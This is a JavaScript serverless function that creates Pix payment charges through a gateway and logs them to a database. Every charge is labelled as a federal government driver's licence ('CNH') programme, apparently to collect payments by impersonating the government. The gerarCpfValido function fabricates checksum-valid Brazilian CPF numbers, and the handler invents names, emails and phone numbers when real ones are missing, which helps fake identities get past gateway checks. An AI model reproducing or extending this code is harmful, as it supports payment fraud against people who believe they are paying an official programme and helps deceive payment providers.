const { getSupabase } = require("./lib/supabase");

const BRAVO_BASE    = "https://bravopay.club/api/v1";
const BRAVO_API_KEY = process.env.BRAVOPAY_API_KEY;

function jsonResponse(statusCode, body) {
  return {
    statusCode,
    headers: {
      "Content-Type": "application/json; charset=utf-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    },
    body: JSON.stringify(body),
  };
}

function normalizeAmountCents(rawAmount) {
  if (rawAmount == null) return 8170;
  const n = Number(rawAmount);
  if (!Number.isFinite(n)) return 8170;
  if (!Number.isInteger(n)) return Math.round(n * 100);
  if (n < 100) return Math.round(n * 100);
  return Math.round(n);
}

function gerarCpfValido() {
  const n = () => Math.floor(Math.random() * 9);
  const d = Array.from({ length: 9 }, n);
  let s1 = d.reduce((a, v, i) => a + v * (10 - i), 0);
  let r1 = (s1 * 10) % 11; if (r1 >= 10) r1 = 0;
  d.push(r1);
  let s2 = d.reduce((a, v, i) => a + v * (11 - i), 0);
  let r2 = (s2 * 10) % 11; if (r2 >= 10) r2 = 0;
  d.push(r2);
  return d.join('');
}

async function postWithRetry(url, payload, headers) {
  const delays = [1000, 2000, 4000];
  let lastErr;
  for (let attempt = 0; attempt < 3; attempt++) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    try {
      const resp = await fetch(url, {
        method: "POST",
        headers,
        body: JSON.stringify(payload),
        signal: controller.signal,
      });
      clearTimeout(timeout);
      // 4xx são erros definitivos — não adianta retry
      if (resp.status >= 400 && resp.status < 500) return resp;
      if (resp.ok) return resp;
      lastErr = new Error(`HTTP ${resp.status}`);
    } catch (err) {
      clearTimeout(timeout);
      lastErr = err;
    }
    if (attempt < 2) await new Promise((r) => setTimeout(r, delays[attempt]));
  }
  throw lastErr;
}

exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      },
      body: "",
    };
  }

  let body = {};
  try {
    body = event.body ? JSON.parse(event.body) : {};
  } catch { body = {}; }

  const randDigits = (len) => Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join("");
  const randId = randDigits(6);

  const rawAmount   = body.amount ?? body.valor ?? body.total ?? 3840;
  const amountCents = normalizeAmountCents(rawAmount);

  const customerName  = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString().trim();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@gmail.com`).toString().trim();
  const rawPhone      = (body.phone || body.customer_phone || `11${randDigits(9)}`).toString().replace(/\D/g, "");
  const cpfRaw        = (body.cpf || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
  const customerCpf   = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();

  // UTMs repassados pelo frontend
  const utm = body.utm || {};

  const payload = {
    amount_cents: amountCents,
    method:       "pix",
    description:  "CNH do Brasil - Programa Governo Federal",
    customer: {
      name:  customerName,
      email: customerEmail,
      cpf:   customerCpf,
      phone: rawPhone ? `+55${rawPhone.replace(/^55/, "")}` : undefined,
    },
    utm: {
      source:   utm.source   || utm.utm_source   || null,
      medium:   utm.medium   || utm.utm_medium   || null,
      campaign: utm.campaign || utm.utm_campaign || null,
      content:  utm.content  || utm.utm_content  || null,
      term:     utm.term     || utm.utm_term     || null,
      fbclid:   utm.fbclid   || null,
      gclid:    utm.gclid    || null,
      ttclid:   utm.ttclid   || null,
    },
  };

  // product_id opcional — só envia se estiver configurado
  if (process.env.BRAVOPAY_PRODUCT_ID) {
    payload.product_id = process.env.BRAVOPAY_PRODUCT_ID;
  }

  const headers = {
    "Content-Type":  "application/json",
    "Authorization": `Bearer ${BRAVO_API_KEY}`,
  };

  let resp;
  try {
    resp = await postWithRetry(`${BRAVO_BASE}/transactions`, payload, headers);
  } catch (err) {
    return jsonResponse(502, { success: false, error: "Falha ao conectar com gateway: " + String(err) });
  }

  const text = await resp.text();
  if (!resp.ok) {
    let errMsg = text;
    try {
      const parsed = JSON.parse(text);
      errMsg = parsed?.error?.message || parsed?.message || text;
    } catch {}
    return jsonResponse(resp.status, { success: false, error: errMsg, raw: text });
  }

  let parsed = {};
  try { parsed = JSON.parse(text); } catch {
    return jsonResponse(500, { success: false, error: "Resposta inválida da gateway", raw: text });
  }

  // BravoPay retorna: { id, status, pix: { copy_paste, expires_at }, ... }
  const transactionId = parsed.id || null;
  const pixCode       = parsed.pix?.copy_paste || null;

  try {
    const supabase = getSupabase();
    await supabase.from("transactions").insert({
      transaction_id: transactionId,
      amount:         amountCents / 100,
      customer_name:  customerName,
      customer_email: customerEmail,
      customer_cpf:   customerCpf,
      customer_phone: rawPhone,
      status:         "PENDING",
      brcode:         pixCode,
      utm_source:     payload.utm.source,
      utm_campaign:   payload.utm.campaign,
      utm_medium:     payload.utm.medium,
      utm_content:    payload.utm.content,
      utm_term:       payload.utm.term,
    });
  } catch (_) {}

  return jsonResponse(200, {
    success:        true,
    pixCode,
    pix_code:       pixCode,
    brcode:         pixCode,
    payload:        pixCode,
    qr_code_image:  null,
    transaction_id: transactionId,
    transactionId,
    deposit_id:     transactionId,
    status:         parsed.status || "PENDING",
  });
};
